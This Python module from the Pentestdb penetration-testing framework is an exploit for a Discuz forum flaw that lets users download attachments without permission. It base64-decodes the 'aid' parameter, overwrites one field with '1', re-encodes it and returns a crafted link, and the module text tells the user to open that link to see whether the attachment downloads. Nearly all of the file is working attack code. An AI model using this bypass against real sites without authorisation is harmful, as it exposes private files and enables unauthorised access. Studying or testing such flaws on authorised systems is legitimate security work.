#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2015 alpha1e0
'''


import base64
import urllib

from script.libs.exploit import Exploit
from script.libs.exploit import Result



class DiscuzFD(Exploit):
    expName = u"Discuz 绕过权限附件下载"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "discuz"
    reference = ['http://www.wooyun.org/bugs/wooyun-2014-048914']
    description = u'''
        漏洞利用条件：未知
        生成bypass id
    '''

    def genBypassLink(self):
        aid = self.params.get('aid',None)
        if not aid:
            return ""

        aidDecoded = base64.b64decode(aid)
        aidDecodedSp = aidDecoded.split("|")
        aidDecodedSp[3] = "1"
        newaid = base64.b64encode("|".join(aidDecodedSp))

        pos = self.url.find("aid=")

        return self.url[0:pos+4] + urllib.quote(newaid)


    def _info(self):
        result = Result(self)

        result['isvul'] = result.INFO
        result['elseinfo'] = u"访问以下链接，查看是否可以下载附件：{0}".format(self.genBypassLink())

        return result


